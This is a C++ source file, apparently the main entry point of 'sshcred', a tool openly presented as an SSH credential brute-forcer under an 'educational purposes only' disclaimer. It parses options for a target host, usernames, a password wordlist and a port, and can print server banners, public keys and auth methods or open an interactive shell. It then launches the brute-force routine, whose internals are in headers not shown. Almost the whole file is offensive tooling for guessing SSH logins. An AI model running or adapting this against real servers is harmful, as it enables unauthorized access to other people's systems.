/**
 * The MIT License (MIT) THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES ONLY
    Copyright (C) 2022 Anonymous Hacks Date: Thus june 2, 2022

    Permission is hereby granted, free of charge, to any person obtaining a copy of this software
    and associated documentation files (the "Software"), to deal in the Software without restriction
    , including without limitation the rights to use, copy, modify, merge, publish, distribute, 
    sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is 
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all copies
    or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
    INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR 
    PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY 
    CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "sshcred.hpp"
#include "shell/shell.hpp"

std::string name = 
"███████╗███████╗██╗  ██╗ ███████╗███████╗ ███████╗███████╗  \n"
"██╔════╝██╔════╝██║  ██║██╔═════╝██╔═══██╗██╔════╝██╔═══██╗ \n"
"███████╗███████╗███████║██║      ███████╔╝███████╗██║   ██║ \n"
"╚════██║╚════██║██╔══██║██║      ██╔═══██╗██╔════╝██║   ██║ \n"
"███████║███████║██║  ██║╚███████╗██║   ██║███████╗███████╔╝ \n"
"╚══════╝╚══════╝╚═╝  ╚═╝ ╚══════╝╚═╝   ╚═╝╚══════╝╚══════╝  \n";


std::string about = 
"    ⚓️                                             ⚓️ \n"  
"    ⚓️ Author : Anonymous Hacks💻️                  ⚓️ \n"
"    ⚓️ GitHub : https://github.com/4anonz/sshcred  ⚓️ \n"
"    \n";

void parse_cmdl(int, char**);

int main(int argc, char *argv[]) {

    system("clear");
    ssh_init();
    std::cout << name << std::endl;
    std::cout << about << std::endl;
    std::cout <<"\n\n";
    
    if(argc < 2) {
        print_help();
        return 1;
    }

    parse_cmdl(argc, argv);

    return 0;
}


/**
 * This function is use to parse the command line arguments
 * and set the required field values
*/
void parse_cmdl(int argc, char *argv[]) {

    int i {}, j {}, port {};
    std::string pass_file {}, user_file {}, userName {}, hostname {};
    bool isSingleUser = false;
    SSHCred sshcred {};
    // int threads = 0;
    int stopOnSuccess = 0;

    /**
     * Our for loop that is used to check for required fields
    */
    i = 1;
    for(; i < argc; ++i) {
        std::string argvs { argv[i] };
        /*Help command*/
        if(argvs == "--help" || argvs == "-h")
            print_help();

        /*Program version command*/
        if(argvs == "-v"|| argvs == "--version") {
            // if more args than expected
        	if(argc > 2)
        		print_help();

            print_version();        	
        }


        /* User file names command*/
        if(argvs == "-U" || argvs == "--user-file") {
             if(!argv[i+1]) {
               std::cout  << "-| [~] "  << argvs
               << "requires a value, use the --help command for more help info\n";
               exit(1);
           }
            
            user_file = argv[i+1];

            // set the user list
            sshcred.setUserdb(user_file);
        }
        
        if(argvs == "-u" || argvs == "--username") {
             if(!argv[i+1]) {
               std::cout  << "-| [~] "  << argvs
               << "requires a value, use the --help command for more help info\n";
               exit(1);
           }
            userName = argv[i+1];
            isSingleUser = true;

            // Set the single username
            sshcred.setUsername(userName);
        }

        if(argvs == "-w" || argvs == "--wordlist")  {

            if(!argv[i+1]) {
               std::cout  << "-| [~] "  << argvs
               << "requires a value, use the --help command for more help info\n";
               exit(1);
           }
           pass_file = argv[i+1];

           // set the password list
           sshcred.setPassworddb(pass_file);
        }

        if(argvs == "-p" || argvs == "--port") {
            /**
             * If it's a port number then we need conver it to na integer, 
             * the 'atoi' function helps with that
            */
           if(!argv[i+1]) {
               std::cout  << "-| [~] "  << argvs
               << "requires a value, use the --help command for more help info\n";
               exit(1);
           }
            port = atoi(argv[i+1]);

            // set the port number
            sshcred.setPort(port);
        }

        /**
         * Programming logic of finding the host from command line
         * without using any flag,.
         * 1. A host must not start with a '-' sign
         * 2. a host must not be followed by any of our args that
         * requires a value.
        */
        if(*argv[i] != '-' && strcmp(argv[i-1], "-w") != 0 && 
                strcmp(argv[i-1], "-u") != 0 && !strstr(argv[i-1], "--username") &&
                strcmp(argv[i-1], "-U") != 0 && !strstr(argv[i-1], "--user-file") &&
                strcmp(argv[i-1], "-p") != 0 && !strstr(argv[i-1], "--port") &&
                !strstr(argv[i-1], "--wordlist")) {
            hostname = argv[i];
        
            // set the hostname
            sshcred.setHost(hostname);
        }

        // /* Stop on success flag*/
        if(argvs == "-s" || argvs == "--stop-on-success") {
            stopOnSuccess = 1;
            sshcred.setStopOnSuccess(stopOnSuccess);
        }
            
        // /* Check for for threads flag*/
        // if(argvs == "-t" || argvs == "--thread") {
        //      if(!argv[i+1]) {
        //        std::cout  << blu << "---| [~] " << res 
        //        << "requires a value, use the --help command for more help info\n";
        //        exit(1);
        //    }
        //     threads = atoi(argv[i+1]);
        // }
    }
    i = 0;
    for(; i < argc; i++) {
        std::string argvs { argv[i] };

    	if(argvs == "--print-banner") {
    		
    		if(argc > 5)
    			print_help();
    		//check to make sure a hostname is provided
    		if(hostname.empty()) {
    			std::cout << "\n-| [~] " << 
                "--print-banner missing argument: host unspecified\n";
    			std::cout << "-| [~] Use --help for more information\n";
    			exit(1);
    		}
            sshcred.printBanner();
    		exit(0);
    	}
    	
    	if(argvs == "--print-pubkey") {
    	
    		if(argc > 5)
    			print_help();

    		// make sure hostname is specified before proceeding
    		if(hostname.empty()) {
    			std::cout << "\n-| [~]" << 
                " --print-pubkey missing argument: host unspecified\n";
    			std::cout << "-| [~] Use --help for more information\n";
    			exit(1);
    		}
		
    		sshcred.printPubkey();
    		exit(0);
    	}

        if(argvs == "-a" || argvs == "--auth-methods") {

            if(argc > 5)
                print_help();
            
            std::cout << "-| [*] Checking authentication methods....\n";
            //make sure a host is speficied
            if(hostname.empty()) {
                std::cout << "\n-| [~] " << argv[i] 
                <<" missing an argument: host unspecified\n";
                std::cout << "-| [~] Use --help for more information\n";
                exit(1);
            }
            
            sshcred.printAuthenticationMethods();
            exit(0);
        }
        if(argvs == "-o" || argvs == "--open-shell") {
            
            if (argc > 5)
                print_help();
            
            if(hostname.empty()) {
                std::cout << "--| [~] No target host provided\n";
                exit(1);
            }
            if (userName.empty()) {
                std::cerr << "--| [~] Please specify a username using '--username' or '-u'\n";
                std::cout << "--| [~] Use '--help' for more information.\n";
                exit(1);
            }
            Shell shell {hostname, userName, port};

            // Authenticate the server
            shell.authServer();

            // Authenticate the user
            int t {}, ret {};
        auth_user:
            ++t;
            ret = shell.authUser();
            if(ret == SSH_AUTH_SUCCESS)
                printf("-| [*] Authentication Successful\n");
            else {
                int m = ssh_userauth_list(shell.getSSH(), NULL);
                if(m & SSH_AUTH_METHOD_PASSWORD)
                    if(t == 3) {
                        printf("-| [~] Authentication Failed\n");
                        goto shutdown;
                    }
                    else     
                        goto auth_user;
            }

            // start an interactive shell
            shell.interactiveShellSession();

        shutdown:
            ssh_disconnect(shell.getSSH());
            exit(0);
        }
    
    
    }

    /**
     * We check to make sure every required fields are supplied
     * otherwise we print a help message to the user
    */
  
    if(hostname.empty() || pass_file.empty()) {
        if(user_file.empty() && userName.empty())
            print_help();
        print_help();
        return;
    }
    if (userName.length() > 1 && user_file.length() > 1)
        print_help();

    std::cout << "--| [*] Starting Brute-Foce...\n";
    std::cout << "----------------------------------\n";
    std::cout << "    wordlist:  " << pass_file << std::endl;
    if(isSingleUser)
        std::cout << "    user:      " << userName << std::endl;
    else
        std::cout << "    user:      " << user_file << std::endl;
    std::cout << "----------------------------------\n\n";

    //Then we call this helper function to perform the brute force

    sshcred.brute();

}

